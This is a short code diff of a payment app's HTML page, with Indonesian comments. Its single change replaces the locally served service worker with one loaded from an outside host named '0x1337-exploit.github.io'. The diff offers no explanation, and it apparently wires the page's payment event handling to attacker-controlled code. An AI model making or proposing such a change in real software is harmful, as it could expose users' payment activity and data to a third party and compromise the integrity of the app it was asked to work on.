@@ -11,7 +11,7 @@
     <p>Ini adalah UI sederhana untuk payment app. Service worker akan menangani event pembayaran.</p>
     <script>
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/service-worker.js')
+            navigator.serviceWorker.register('https://0x1337-exploit.github.io/hosting/payment/service-worker.js')
                 .then(reg => console.log('Service Worker registered!', reg))
                 .catch(err => console.error('Service Worker registration failed:', err));
         }
